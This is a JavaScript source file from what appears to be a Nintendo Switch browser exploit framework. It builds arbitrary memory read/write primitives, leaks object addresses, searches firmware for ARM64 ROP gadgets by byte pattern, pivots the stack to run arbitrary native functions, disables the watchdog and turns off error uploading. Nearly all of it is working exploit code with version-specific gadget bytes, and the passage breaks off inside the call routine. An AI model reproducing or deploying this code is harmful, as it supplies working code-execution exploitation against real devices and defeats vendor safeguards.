
var IFile = require('./fs/IFile');
var IFileSystem = require('./fs/IFileSystem');
var IDirectory = require('./fs/IDirectory');
var IStorage = require('./fs/IStorage');

var config = require('../config');

/**
 A value that represents a 64-bit Integer<br>
 This is an array of exactly 2 values, as described below.

 @typedef {Array.<number>} u64
 @property {number} 0 - Low value of u64
 @property {number} 1 - High value of u64
 @example
 [ 0x00000000, 0xffff0000 ]
 */

/**
 Represents an instance of SploitCore
 @constructor
 @param {object} exploitMe - Reference to object used for leaking data
 @property {u64} base - Base address
 @property {boolean} isBrowser - Returns true
 @property {string} name - Returns "browser"
 */
var SploitCore = function (exploitMe) {
	this.gc();

	this.va = exploitMe.va;
	this.vb = exploitMe.vb;
	this.leakee = exploitMe.leakee;
	this.leakaddr = exploitMe.leakaddr;

	this.allocated = {};

	this.func = document.getElementById;
	this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9

	if (!SploitCore.prototype.importedMixins) {
		Object.keys(svcMixin).forEach((k) => {
			SploitCore.prototype[k] = svcMixin[k];
		});

		Object.keys(sploitMixin).forEach((k) => {
			SploitCore.prototype[k] = sploitMixin[k];
		});

		SploitCore.prototype.importedMixins = true;
	}

	this.sc = this;

	this.base = this.getBase();

	this.mainaddr = this.walkList();
	utils.dlog('Main address ' + utils.paddr(this.mainaddr));
	
	// This isn't exactly right, but really shouldn't matter.  As long as it's <= the real size, we won't crash.
	this.mainTextSize = 0x5B2000;
	this.wkcTextSize = 0xF37000;

	if (utils.version == 100) {
		this.mainTextSize = 0x5E7000;
	} else if (utils.version >= 500) {
		this.mainTextSize = 0x6F3000;
	}
	
	this.gadgetCache = this.loadCache();

	this.fake_stack = this.malloc(0x100000);

	this.ipcBuf = new Uint32Array(0x2000 >> 2);
	this.emptyIpcBuf = new Uint32Array(0x2000 >> 2); // Keep this empty.
	this.ipcBufAddr = this.getArrayBufferAddr(this.ipcBuf);
	this.sploitMixinInit();
	this.ipcServices = {};

	this.gc();

	this.enableTurbo();
	
	utils.log('Disabling watchdog timer...');
	this.disableWatchdog();

	var versbuf = new ArrayBuffer(0x100);
	this.ipcMsg(3).cDescriptor(versbuf).sendTo("set:sys").assertOk();
	this.version = utils.u8a2nullstr(new Uint8Array(versbuf, 0x68, 0x100-0x68));
	utils.log("System Version: " + this.version);
	
	var sc = this;

	if (this.version == '1.0.0' && config.sdbcore && utils.hasSmhax()) {
		utils.log('Pwning sdb module...');
		this.sdb = new SDBCore(this, this.version);
		if(!this.sdb.initialized) {
			utils.log('Failed to initialize sdb');
			this.sdb = null;
		}
	}
	
	if (config.nvcore && utils.hasNvcore(this.version)) {
		utils.log('Pwning nv module...');
		this.nv = new NVCore(this, this.version);
		if(!this.nv.initialized) {
			utils.log('Failed to initialize nv');
			this.nv = null;
		}
	}

	/* Can't access any of this without smhax. */
	if (utils.hasSmhax()) {
		sc.getServices(["set:sys", "set:fd"], function (setsys, setfd) {
			var getSetting = function (session, cls, nam) { // session is set:sys
				var out = new Uint32Array(1);
				var x1 = utils.str2ab(cls);
				var x2 = utils.str2ab(nam);
				return sc.ipcMsg(38).bDescriptor(out, 4, 0).xDescriptor(x1, 48, 0).xDescriptor(x2, 48, 1).sendTo(session).asResult().map((r) => out[0]);
			}

			var setSetting = function (session, cls, nam, value) { // session is set:fd
				var a = new Uint32Array(1);
				a[0] = value;
				var x1 = utils.str2ab(cls);
				var x2 = utils.str2ab(nam);
				return sc.ipcMsg(2).xDescriptor(x1, 48, 0).xDescriptor(x2, 48, 1).aDescriptor(a, 4, 0).sendTo(session).asResult();
			}
			var cls = 'eupld', name = 'upload_enabled';
			var orig = getSetting(setsys, cls, name).assertOk();
			if(orig == 1) {
				utils.log('Disabling error uploading.');
				setSetting(setfd, cls, name, 0).assertOk();
			}

			if (this.version == '3.0.0') {
				orig = getSetting(setsys, "ro", "ease_nro_restriction").assertOk();
				if(orig == 0) {
					utils.log("Easing nro restriction...");
					setSetting(setfd, "ro", "ease_nro_restriction", 1).assertOk();
				}
			}
		});
	}

	if (utils.version != 100) {
		this.asyncCaller = new AsyncCaller(this);
	}
	
	utils.log('~~success');
};

SploitCore.prototype.isBrowser = true;
SploitCore.prototype.name = "browser";

/**
	Returns address of function
	@returns {u64} Address of function 
 */
SploitCore.prototype.getFuncAddr = function () {
	this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
	var tlfuncaddr = this.getAddr(this.func);
	return this.read8(tlfuncaddr, 6);
};

/**
	Reads 4 bytes from address
	@param {u64} addr - Address to read value from
	@param {number} [offset=0] - Offset to add to addr before read
	@returns {number}
 */
SploitCore.prototype.read4 = function (addr, offset) {
	if (arguments.length === 1) { offset = 0; }

	utils.assertu64(addr);
  
	this.va[4] = addr[0];
	this.va[5] = addr[1];
	this.va[6] = 1 + offset;
	return this.vb[offset];
};

/**
	Writes 4 bytes to address
	@param {number} val - Value to write
	@param {u64} addr - Address to write value to
	@param {number} [offset=0] - Offset to add to addr before write
 */
SploitCore.prototype.write4 = function (val, addr, offset) {
	if (arguments.length === 2) { offset = 0; }

	this.va[4] = addr[0];
	this.va[5] = addr[1];
	this.va[6] = 1 + offset;

	this.vb[offset] = val;
};

/**
	Reads 8 bytes from address
	@param {u64} addr - Address to read value from
	@param {number} [offset=0] - Offset to add to addr before read
	@returns {number}
 */
SploitCore.prototype.read8 = function (addr, offset) {
	if (arguments.length === 1) { offset = 0; }
	return [this.read4(addr, offset), this.read4(addr, offset + 1)];
};

/**
	Writes 8 bytes to address
	@param {number} val - Value to write
	@param {u64} addr - Address to write value to
	@param {number} [offset=0] - Offset to add to addr before write
 */
SploitCore.prototype.write8 = function (val, addr, offset) {
	if (arguments.length === 2) { offset = 0; }
	val = utils.pad64(val);
	this.write4(val[0], addr, offset);
	this.write4(val[1], addr, offset + 1);
};

/**
	Calls callback with an ArrayBuffer pointing to the view of memory requested.<br>
	If you return a value from within the callback it will be returned by {@link SploitCore#memview}<br>
	<b>Warning:</b> If you keep that view or any object using it around; you will tank the GC and your Switch will crash.
	@param {u64} addr - Base address for view
	@param {number} size - Number of bytes to view
	@param {function} func - Function which is called with ArrayBuffer.
	@returns {any} Value returned by func
 */
SploitCore.prototype.memview = function (addr, size, func) {
	var ab = new ArrayBuffer(0);
	var taddr = this.read8(this.getAddr(ab), 4);

	var origPtr = this.read8(taddr, 6);
	var origSize = this.read4(taddr, 8);
	this.write8(addr, taddr, 6);
	this.write4(size, taddr, 8);

	var ret = func.apply(this, [ab]);

	this.write8(origPtr, taddr, 6);
	this.write4(origSize, taddr, 8);

	return ret;
};

/**
	Returns address of object
	@param {object} obj - Object to get address of
	@returns {u64} Address of object
 */
SploitCore.prototype.getAddr = function (obj) {
	this.leakee['b'] = {'a': obj};
	return this.read8(this.read8(this.leakaddr, 4), 4);
};

/**
	Calculate address relative to main address
	@param {u64} off - Offset
	@returns {u64} Relative address
 */
SploitCore.prototype.mref = function (off) {
	return utils.add2(this.mainaddr, off);
};

/**
	Returns base address of current module
	@private
	@returns {u64}
 */
SploitCore.prototype.getBase = function () {
	var funcaddr = this.getFuncAddr();

	utils.dlog('Searching for start of module.');

	var baseaddr = this.read8(funcaddr, 8);
	baseaddr[0] = (baseaddr[0] & 0xFFFFF000) >>> 0;
	while (this.read4(baseaddr, 4) !== 0x304F524E) { baseaddr = utils.add2(baseaddr, -4096); }

	utils.dlog('First module ... ' + utils.paddr(baseaddr));

	return baseaddr;
};

/**
	TODO DOCS
	@private
 */
SploitCore.prototype.walkList = function () {
	var addr = this.base;
	utils.dlog('Initial NRO at ' + utils.paddr(addr));

	while (true) {
		var modoff = this.read4(addr, 1);
		addr = utils.add2(addr, modoff);
		var modstr = this.read4(addr, 6);
		addr = utils.add2(addr, modstr);

		// Read next link ptr
		addr = this.read8(addr);
		if (utils.nullptr(addr)) {
			utils.log('Reached end');
			break;
		}

		var nro = this.read8(addr, 8);

		if (utils.nullptr(nro)) {
			utils.dlog('Hit RTLD at ' + utils.paddr(addr));
			addr = this.read8(addr, 4);
			break;
		}

		if (this.read4(nro, 4) !== 0x304f524e) {
			utils.log('Something is wrong.	No NRO header at base.');
			break;
		}

		addr = nro;
		utils.dlog('Found NRO at ' + utils.paddr(nro));
	}

	while (true) {
		nro = this.read8(addr, 8);
		if (utils.nullptr(nro)) {
			utils.dlog('Hm, hit the end of things.	Back in rtld?');
			return;
		}

		if (this.read4(nro, this.read4(nro, 1) >> 2) === 0x30444f4d) {
			utils.dlog('Got MOD at ' + utils.paddr(nro));
			if (this.read4(nro, 4) === 0x8DCDF8 && this.read4(nro, 5) === 0x959620) {
				utils.dlog('Found main module.');
				this.wifiApplet = true;
				return nro;
			} else if (this.read4(nro, 4) === 0x2a0103f3 && this.read4(nro, 5) === 0x94000002) {
				utils.dlog('Found main module.');
				this.wifiApplet = false;
				return utils.add2(nro, 0x6000);
			}
		} else {
			utils.dlog('No valid MOD header.  Back at RTLD.');
			break;
		}

		addr = this.read8(addr, 0);
		if (utils.nullptr(addr)) {
			utils.dlog('End of chain.');
			break;
		}
	}
};

/**
	Returns a cache of gadgets for speed boost
	@private
	@returns {object}
 */
SploitCore.prototype.loadCache = function () {
	var self = this;
	function checkGadget (base, size, gadget, offset) {
		if (offset + gadget.length >= size) { return false; }
		return self.memview(utils.add2(base, offset), gadget.length, function (ab) {
			var u8 = new Uint8Array(ab);
			for (var i = 0; i < gadget.length; ++i) {
				if (gadget[i] !== -1 && gadget[i] !== u8[i]) { return false; }
			}
			return true;
		});
	}
	var request = new XMLHttpRequest();
	request.open('GET', '/cache', false);
	request.send(null);
	if (request.status === 200) {
		var cache = JSON.parse(request.responseText);
		for (var key in cache) {
			var offset = cache[key];
			key = JSON.parse('[' + key + ']');
			if (!checkGadget(this.mainaddr, this.mainTextSize, key, offset) && !checkGadget(this.base, this.wkcTextSize, key, offset)) {
				utils.log('Gadget cache invalid');
				return {};
			}
		}
		return cache;
	} else { return {}; }
};


// XXX: Make this work on uint32s.	Way faster.

/**
	Finds a gadget that matches required pattern
	@param {Array.<number>} input - Hex pattern to match
	@param {boolean} inWkc - Search in wkc
	@returns {u64|null} Address of gadget, or null if not found. 
 */
SploitCore.prototype.gadget = function (input, inWkc) {
	if (arguments.length === 1) { inWkc = false; }

	var bytes;
	if (typeof (input) === 'string') {
		var arr = [];
		for (var i = 0; i < input.length; i += 2) {
			arr.push(parseInt(input.substring(i, i + 2), 16));
		}
		bytes = arr;
	} else {
		bytes = input;
	}

	var ta = inWkc ? this.base : this.mainaddr;

	if (bytes in this.gadgetCache) {
		// utils.dlog('Found bytes in gadget cache');
		return utils.add2(ta, this.gadgetCache[bytes]);
	}

	var ts = inWkc ? this.wkcTextSize : this.mainTextSize;

	var ss = ts - bytes.length;
	var pair = this.memview(ta, ts, function (ab) {
		var u8 = new Uint8Array(ab);
		for (var i = 0; i < ss; i += 4) {
			var miss = false;
			for (var j = 0; j < bytes.length; ++j) {
				if (bytes[j] !== -1 && u8[i + j] !== bytes[j]) {
					miss = true;
					break;
				}
			}
			if (!miss) {
				var addr = utils.add2(ta, i);
				utils.log('Found gadget at ' + utils.paddr(addr));
				return [addr, i];
			}
		}
		return null;
	});

	if (pair === null) {
		var f = '';
		for (i = 0; i < bytes.length; ++i) {
			f += ('0' + bytes[i].toString(16)).slice(-2) + ' ';
		}
		utils.log('Could not find gadget with bytes: ' + f);
		throw new Error('Bad gadget');
	}

	this.gadgetCache[bytes] = pair[1];
	utils.pushCache(this.gadgetCache);
	return pair[0];
};

/**
	Disables the browser watchdog
 */
SploitCore.prototype.disableWatchdog = function () {
	if (utils.version == 100) {
		var vm = this.call(this.gadget([0xF4, 0x4F, 0xBE, 0xA9, 0xFD, 0x7B, 0x01, 0xA9, 0xFD, 0x43, 0x00, 0x91, 0xFF, 0x83, 0x00, 0xD1, 0xD3, 0xBF, 0x00, 0x90, 0x73, 0x02, 0x0D, 0x91, 0x60, 0x42, 0x00, 0x91], true));
	} else if ((utils.version >= 200) && (utils.version < 300)) {
		var vm = this.call(this.gadget([0xFF, 0x03, 0x01, 0xD1, 0xF4, 0x4F, 0x02, 0xA9, 0xFD, 0x7B, 0x03, 0xA9, 0xFD, 0xC3, 0x00, 0x91, 0x53, -1, -1, -1, 0x73, -1, -1, -1, 0x60, 0x22, 0x00, 0x91, 0x08, 0xFC, 0xDF, 0x08, 0x48, 0x01, 0x00, 0x37], true));
	} else if ((utils.version >= 300) && (utils.version < 400)) {
		var vm = this.call(this.gadget([0xFF, 0x03, 0x01, 0xD1, 0xF4, 0x4F, 0x02, 0xA9, 0xFD, 0x7B, 0x03, 0xA9, 0xFD, 0xC3, 0x00, 0x91, 0x73, -1, -1, -1, 0x73, -1, -1, -1, 0x60, 0x22, 0x00, 0x91, 0x08, 0xFC, 0xDF, 0x08, 0x48, 0x01, 0x00, 0x37], true));
	} else if ((utils.version >= 400) && (utils.version < 500)) {
		var vm = this.call(this.gadget([0xFF, 0xC3, 0x00, 0xD1, 0xF4, 0x4F, 0x01, 0xA9, 0xFD, 0x7B, 0x02, 0xA9, 0xFD, 0x83, 0x00, 0x91, 0xD3, -1, -1, -1, 0x73, -1, -1, -1, 0x60, 0x22, 0x00, 0x91, 0x08, 0xFC, 0xDF, 0x08, 0x48, 0x01, 0x00, 0x37], true));
	} else if ((utils.version >= 500) && (utils.version < 600)) {
		var vm = this.call(this.gadget([0xFF, 0xC3, 0x00, 0xD1, 0xF4, 0x4F, 0x01, 0xA9, 0xFD, 0x7B, 0x02, 0xA9, 0xFD, 0x83, 0x00, 0x91, 0x13, -1, -1, -1, 0x73, -1, -1, -1, 0x60, 0x22, 0x00, 0x91, 0x08, 0xFC, 0xDF, 0x08, 0x48, 0x01, 0x00, 0x37], true));
	} else if (utils.version == 600) {
		var vm = this.call(this.gadget([0xFF, 0xC3, 0x00, 0xD1, 0xF4, 0x4F, 0x01, 0xA9, 0xFD, 0x7B, 0x02, 0xA9, 0xFD, 0x83, 0x00, 0x91, 0xE8, -1, -1, -1, 0x08, -1, -1, -1, 0x00, 0x21, 0x00, 0x91, 0x08, 0xFC, 0xDF, 0x08, 0x68, 0x01, 0x00, 0x36], true));
	}
	
	utils.log("VM: " + utils.paddr(vm));

	var wd = this.read8(utils.add2(vm, 0x2768));
	utils.log("WD: " + utils.paddr(wd));

	var ret0 = this.gadget([0xe0, 0x03, 0x1f, 0xaa, 0xc0, 0x03, 0x5f, 0xd6]);

	var current = this.read8(wd, 8 >> 2);
	if (current[0] != 0xFFFFFFFF || current[1] != 0x7FFFFFFF) {
		this.call(this.gadget([0xF9, 0x0F, 0x1B, 0xF8, 0xF8, 0x5F, 0x01, 0xA9, 0xF6, 0x57, 0x02, 0xA9, 0xF4, 0x4F, 0x03, 0xA9, 0xFD, 0x7B, 0x04, 0xA9, 0xFD, 0x03, 0x01, 0x91, 0xF3, 0x03, 0x00, 0xAA, 0x79, 0x06, 0x40, 0xF9, 0x68, 0x92, 0x40, 0x39], true), [wd, vm, [0xFFFFFFFF, 0x7FFFFFFF], ret0, 0, 0]);
	}
};

/**
	Returns the address of SP
	@returns {u64} Address of SP
 */
SploitCore.prototype.getSP = function () {
	// First gadget
	var jaddr = this.gadget([0x74, 0x32, 0x40, 0xF9, 0x7F, 0x3E, 0x00, 0xF9, 0x14, 0x01, 0x00, 0xB4, 0x80, 0x0A, 0x40, 0xF9]);

	utils.dlog('New jump at ' + utils.paddr(jaddr));
	utils.dlog('Assigning function pointer');

	var carr = new Uint32Array(16);
	var cbuf = this.read8(this.getAddr(carr), 4);

	var struct1 = this.malloc(0x48);
	var struct2 = this.malloc(0x28);
	var struct3 = this.malloc(0x518);
	var struct4 = this.malloc(0x38);

	this.write8(struct1, cbuf, 0);
	this.write8(this.gadget([0x09, 0x09, 0x40, 0xf9, 0x00, 0x01, 0x40, 0xf9, 0x01, 0x29, 0x40, 0xb9, 0x02, 0x1d, 0x40, 0xf9, 0x20, 0x01, 0x3f, 0xd6]), cbuf, 0x8 >> 2);
	this.write8(this.gadget([0x08, 0x08, 0x40, 0xf9, 0x00, 0x01, 0x40, 0xf9, 0x05, 0x10, 0x40, 0xf9, 0xa0, 0x00, 0x1f, 0xd6]), cbuf, 0x10 >> 2);

	this.write8(this.gadget([0xE8, 0x03, 0x00, 0xAA, 0x02, 0x05, 0x40, 0xF9, 0x82, 0x00, 0x00, 0xB4, 0xE0, 0x03, 0x00, 0x32]), struct1, 0);
	this.write8(struct2, struct1, 0x10 >> 2);

	this.write8(struct3, struct2, 0);
	this.write8(this.gadget([0xf3, 0x03, 0x00, 0xaa, 0x08, 0x41, 0x00, 0x91, 0x68, 0x02, 0x00, 0xf9, 0x68, 0x0e, 0x40, 0xf9, 0x00, 0x01, 0x3f, 0xd6]), struct2, 0x20 >> 2);

	this.write8([0x00000000, 0xffff0000], struct3, 0x8 >> 2);
	this.write8(this.gadget([0x08, 0x88, 0x42, 0xf9, 0x02, 0x19, 0x40, 0xf9, 0x40, 0x00, 0x1f, 0xd6]), struct3, 0x18 >> 2);
	this.write8(this.gadget([0x09, 0x11, 0x40, 0xf9, 0xe8, 0x23, 0x00, 0x91, 0xe1, 0x03, 0x14, 0xaa, 0x20, 0x01, 0x3f, 0xd6]), struct3, 0x20 >> 2);
	this.write8(struct4, struct3, 0x510 >> 2);

	this.write8(this.gadget([0x78, 0x06, 0x40, 0xf9, 0xe1, 0x03, 0x1e, 0x32, 0x00, 0x01, 0x3f, 0xd6]), struct4, 0x18 >> 2);
	this.write8(this.gadget([0x60, 0x03, 0x3f, 0xd6]), struct4, 0x28 >> 2);
	this.write8(this.gadget([0x02, 0x0d, 0x40, 0xf9, 0x08, 0x15, 0x40, 0xf9, 0xe0, 0x03, 0x01, 0xaa, 0xe1, 0x03, 0x08, 0xaa, 0x40, 0x00, 0x1f, 0xd6]), struct4, 0x30 >> 2);

	var funcaddr = this.getFuncAddr();
	utils.dlog('Function object at ' + utils.paddr(funcaddr));

	var curptr = this.read8(funcaddr, 8);
	this.write8(jaddr, funcaddr, 8);
	// utils.log('Patched function address from ' + utils.paddr(curptr) + ' to ' + utils.paddr(this.read8(this.funcaddr, 8)));

	utils.dlog('Assigned.  Jumping to get SP.');
	this.func.apply(0x100, [0, 0, 0, 0, 0, 0, 0, 0, carr, 0, 0, 0, 0, 0, 0, 0, 0]);
	utils.dlog('Jumped back from getting SP.');

	this.write8(curptr, funcaddr, 8);
	utils.dlog('Restored original function pointer.');

	var sp = utils.add2(this.read8(struct3, 0), -0x18);
	utils.dlog('Got stack pointer: ' + utils.paddr(sp));

	this.free(struct1);
	this.free(struct2);
	this.free(struct3);
	this.free(struct4);

	utils.dlog('Freed buffers');

	return sp;
};

/**
	Allocates a region of memory to use
	@param {number} bytes - Size of region
	@returns {u64} Address of region
 */
SploitCore.prototype.malloc = function (bytes) {
	var obj = new ArrayBuffer(bytes);
	var addr = this.getArrayBufferAddr(obj);
	this.allocated[addr] = obj;
	return addr;
};

/**
	TODO DOCS
 */
SploitCore.prototype.free = function (addr) {
	delete this.allocated[addr];
};

/**
	TODO DOCS
 */
SploitCore.prototype.getArrayBufferAddr = function (ab) {
	var offset = 0;
	if (ArrayBuffer.isView(ab)) {
		offset = ab.byteOffset;
		ab = ab.buffer;
	}
	if (!(ab instanceof ArrayBuffer)) {
		throw new Error('expected ArrayBuffer or view');
	}
	return utils.add2(this.read8(this.read8(this.getAddr(ab), 4), 6), offset);
};

/**
	TODO DOCS
 */
SploitCore.prototype.call = function (funcptr, args, fargs, registers, dump_regs) {
	if (typeof (funcptr) === 'number') {
		funcptr = utils.add2(this.mainaddr, funcptr);
	}
	switch (arguments.length) {
	case 1: {
		args = [];
	}
	case 2: {
		fargs = [];
	}
	case 3: {
		registers = [];
	}
	case 4: {
		dump_regs = false;
	}
	}

	if(this.turbo &&
		 args.length <= 13 && registers.length <= 8 &&
		 fargs.length === 0 && (args.length === 0 || registers.length === 0)) {
		if (!args.length) { args = registers; }
		return this.altcaller.call.apply(this.altcaller, [funcptr].concat(args));
	}
	
	for (var i = 0; i < args.length; i++) {
		if (args[i] instanceof ArrayBuffer || ArrayBuffer.isView(args[i])) {
			args[i] = this.getArrayBufferAddr(args[i]);
		}
		if (typeof(args[i]) !== "number" && !Array.isArray(args[i])) {
			throw new Error("argument " + i + " is invalid: " + args[i]);
		}
	}

	var carr = new Uint32Array(16);
	var cbuf = this.read8(this.getAddr(carr), 4);

	utils.dlog('Starting holy rop');
	var jaddr = this.gadget([0x74, 0x32, 0x40, 0xF9, 0x7F, 0x3E, 0x00, 0xF9, 0x14, 0x01, 0x00, 0xB4, 0x80, 0x0A, 0x40, 0xF9]);
	utils.dlog('New jump at ' + utils.paddr(jaddr));

	utils.dlog('Setting up structs');

	// Begin Gadgets
	var mov_x0_into_x8_load_br_x2 = this.gadget([0xE8, 0x03, 0x00, 0xAA, 0x02, 0x05, 0x40, 0xF9, 0x82, 0x00, 0x00, 0xB4, 0xE0, 0x03, 0x00, 0x32]);
	var load_x0_w1_x2_x9_blr_x9 = this.gadget([0x09, 0x09, 0x40, 0xf9, 0x00, 0x01, 0x40, 0xf9, 0x01, 0x29, 0x40, 0xb9, 0x02, 0x1d, 0x40, 0xf9, 0x20, 0x01, 0x3f, 0xd6]);
	var load_x2_x30_mov_sp_into_x2_br_x30 = this.gadget([0x1d, 0x78, 0x45, 0xa9, 0x02, 0x34, 0x40, 0xf9, 0x5f, 0x00, 0x00, 0x91, 0x08, 0x24, 0x47, 0x6d, 0x0a, 0x2c, 0x48, 0x6d, 0x0c, 0x34, 0x49, 0x6d, 0x0e, 0x3c, 0x4a, 0x6d, 0xe0, 0x03, 0x01, 0xaa, 0x41, 0x00, 0x00, 0xb5, 0x20, 0x00, 0x80, 0xd2, 0xc0, 0x03, 0x1f, 0xd6]);
	var load_x2_x8_br_x2 = this.gadget([0x02, 0x0d, 0x40, 0xf9, 0x08, 0x15, 0x40, 0xf9, 0xe0, 0x03, 0x01, 0xaa, 0xe1, 0x03, 0x08, 0xaa, 0x40, 0x00, 0x1f, 0xd6]);
	var load_x30_from_sp_br_x2 = this.gadget([0xfd, 0x7b, 0x42, 0xa9, 0xff, 0xc3, 0x00, 0x91, 0x40, 0x00, 0x1f, 0xd6]);
	var returngadg = this.gadget([0x60, 0x03, 0x3f, 0xd6]);

	var savegadg = this.gadget([0x00, 0x04, 0x00, 0xa9, 0x02, 0x0c, 0x01, 0xa9, 0x04, 0x14, 0x02, 0xa9, 0x06, 0x1c, 0x03, 0xa9]);
	var loadgadg = this.gadget([0x02, 0x0c, 0x41, 0xa9, 0x04, 0x14, 0x42, 0xa9, 0x06, 0x1c, 0x43, 0xa9, 0x08, 0x24, 0x44, 0xa9]);
	var loadgadg_stage2 = this.gadget([0xe0, 0x07, 0xc1, 0xa8, 0xe2, 0x0f, 0xc1, 0xa8, 0xe4, 0x17, 0xc1, 0xa8, 0xe6, 0x1f, 0xc1, 0xa8]);

	var load_x19 = this.gadget([0xf3, 0x17, 0x40, 0xf9, 0xfd, 0x7b, 0x43, 0xa9, 0xff, 0x03, 0x01, 0x91, 0xc0, 0x03, 0x5f, 0xd6]);
	var str_x20 = this.gadget([0x74, 0x0a, 0x00, 0xf9, 0xfd, 0x7b, 0x41, 0xa9, 0xf4, 0x4f, 0xc2, 0xa8, 0xc0, 0x03, 0x5f, 0xd6]);
	var str_x8 = this.gadget([0xfd, 0x7b, 0x41, 0xa9, 0x68, 0x02, 0x00, 0xf9, 0xf3, 0x07, 0x42, 0xf8, 0xc0, 0x03, 0x5f, 0xd6]);
	var load_and_str_x8 = this.gadget([0x68, 0x02, 0x40, 0xf9, 0x88, 0x02, 0x00, 0xf9, 0xfd, 0x7b, 0x41, 0xa9, 0xf4, 0x4f, 0xc2, 0xa8]);
	var str_x1 = this.gadget([0x61, 0x0e, 0x00, 0xf9, 0xfd, 0x7b, 0x41, 0xa9, 0xf4, 0x4f, 0xc2, 0xa8, 0xc0, 0x03, 0x5f, 0xd6]);
	var mov_x2_into_x1 = this.gadget([0xe1, 0x03, 0x02, 0xaa, 0x00, 0x01, 0x3f, 0xd6, 0xfd, 0x7b, 0xc1, 0xa8, 0xe0, 0x03, 0x1f, 0x2a]);
	var str_x0 = this.gadget([0xfd, 0x7b, 0x41, 0xa9, 0x60, 0x02, 0x00, 0xf9, 0xf3, 0x07, 0x42, 0xf8, 0xc0, 0x03, 0x5f, 0xd6]);
	var str_x9 = this.gadget([0x69, 0x2e, 0x00, 0xf9, 0xfd, 0x7b, 0x41, 0xa9, 0xf3, 0x07, 0x42, 0xf8, 0xc0, 0x03, 0x5f, 0xd6]);
	var mov_x19_into_x0 = this.gadget([0xfd, 0x7b, 0x41, 0xa9, 0xe0, 0x03, 0x13, 0xaa, 0xf3, 0x07, 0x42, 0xf8, 0xc0, 0x03, 0x5f, 0xd6]);

	// End Gadgets

	var context_load_struct = this.malloc(0x200);
	var block_struct_0 = this.malloc(0x200);
	var block_struct_1 = this.malloc(0x200);
	var block_struct_2 = this.malloc(0x200);
	var block_struct_3 = this.malloc(0x200);
	var savearea = this.malloc(0x400);
	var loadarea = this.malloc(0x400);
	var dumparea = this.malloc(0x400);
	var allocated_stack = utils.add2(this.fake_stack, 0); // Make a copy.
	var base_sp = this.getSP();

	// Step 0: Load up some initial ROP to launch into full control

	this.write8(utils.add2(cbuf, 0x38), cbuf, 0); // cbuf[0] = cbuf + 0x8
	this.write8(load_x2_x8_br_x2, cbuf, 0x8 >> 2); // Third gadget
	this.write8(load_x0_w1_x2_x9_blr_x9, cbuf, 0x18 >> 2); // Fourth Gadget
	this.write8(block_struct_0, cbuf, 0x28 >> 2); // Setup X8 with struct
	this.write8(mov_x0_into_x8_load_br_x2, cbuf, 0x38 >> 2); // Second gadget

	// Step 1: Load X8 with a fixed address, control X0:X2

	this.write8(context_load_struct, block_struct_0, 0x00 >> 2);
	this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_0, 0x08 >> 2);
	this.write8(load_x2_x30_mov_sp_into_x2_br_x30, block_struct_0, 0x10 >> 2);
	this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_0, 0x18 >> 2);
	this.write8(block_struct_1, block_struct_0, 0x28 >> 2);

	// Step 2: Stack pivot to SP - 0x8000. -0x30 to use a LR-loading gadget.

	this.write8(load_x2_x8_br_x2, context_load_struct, 0x58 >> 2);
	this.write8(allocated_stack, context_load_struct, 0x68 >> 2);
	this.write8(returngadg, context_load_struct, 0x158 >> 2);
	this.write8(base_sp, context_load_struct, 0x168 >> 2);

	// Step 3: Perform a full context-save of all registers to savearea.

	this.write8(savearea, block_struct_1, 0x0 >> 2);
	this.write8(load_x30_from_sp_br_x2, block_struct_1, 0x10 >> 2);
	this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_1, 0x18 >> 2);
	this.write8(block_struct_2, block_struct_1, 0x28 >> 2);
	this.write8(savegadg, block_struct_1, 0x38 >> 2);

	this.write8(load_x2_x8_br_x2, allocated_stack, 0x28 >> 2);

	var sp = utils.add2(allocated_stack, 0x30);

	// Step 4: Perform a full context-load from a region we control.

	this.write8(loadarea, block_struct_2, 0x00 >> 2);
	this.write8(loadgadg, block_struct_2, 0x10 >> 2);

	// Step 5: Write desired register contents to the context load region.

	this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
	this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2

	// Write registers for native code.
	if (registers.length > 9) {
		for (i = 9; i < 30 && i < registers.length; i++) {
			this.write8(registers[i], loadarea, (8 * i) >> 2);
		}
	}

	if (registers.length > 0) {
		for (i = 0; i <= 8 && i < registers.length; i++) {
			this.write8(registers[i], sp, (0x8 * i) >> 2);
		}

		if (registers.length > 19) {
			this.write8(registers[19], sp, 0x48 >> 2);
		}

		if (registers.length > 29) {
			this.write8(registers[29], sp, 0x50 >> 2);
		}
	}

	if (args.length > 0) {
		for (i = 0; i < args.length && i < 8; i++) {
			this.write8(args[i], sp, (0x8 * i) >> 2);
		}
	}

	if (fargs.length > 0) {
		for (i = 0; i < fargs.length && i < 32; i++) {
			this.write8(fargs[i], loadarea, (0x110 + 8 * i) >> 2);
		}
	}

	this.write8(funcptr, loadarea, 0x80 >> 2); // Set the code to call to our function pointer.
	this.write8(load_x19, sp, 0x58 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop

	// Stack arguments would be bottomed-out at sp + 0xE0...
	// TODO: Stack arguments support. Would just need to figure out how much space they take up
	// and write ROP above them. Note: the user would have to call code that actually used
	// that many stack arguments, or shit'd crash.

	// ROP currently begins at sp + 0xE0

	// Step 6: [Arbitrary code executes here]

	// Step 7: Post-code execution cleanup. Dump all registers to another save area,
	//         return cleanly to javascript.

	this.write8(utils.add2(dumparea, 0x300 - 0x10), sp, (0x060 + 0x28) >> 2); // Load X19 = dumparea + 0x300 - 0x10
	this.write8(str_x20, sp, (0x060 + 0x38) >> 2);                      // Load LR with str_x20
	this.write8(utils.add2(dumparea, 0x308), sp, (0x0A0 + 0x8) >> 2);        // Load X19 = dumparea + 0x308
	this.write8(str_x8, sp, (0x0A0 + 0x18) >> 2);                      // Load LR with str_x8
	this.write8(utils.add2(dumparea, 0x310 - 0x18), sp, (0x0C0 + 0x0) >> 2); // Load X19 = dumparea + 0x310 - 0x18
	this.write8(str_x1, sp, (0x0C0 + 0x18) >> 2);                      // Load LR with str_x1
	this.write8(utils.add2(dumparea, 0x3F8), sp, (0x0E0 + 0x0) >> 2);        // Load X20 with scratch space
	this.write8(utils.add2(dumparea, 0x380), sp, (0x0E0 + 0x8) >> 2);        // Load X19 = dumparea + 0x380
	this.write8(str_x1, dumparea, 0x380 >> 2);                         // Write str_x1 to dumparea + 0x380
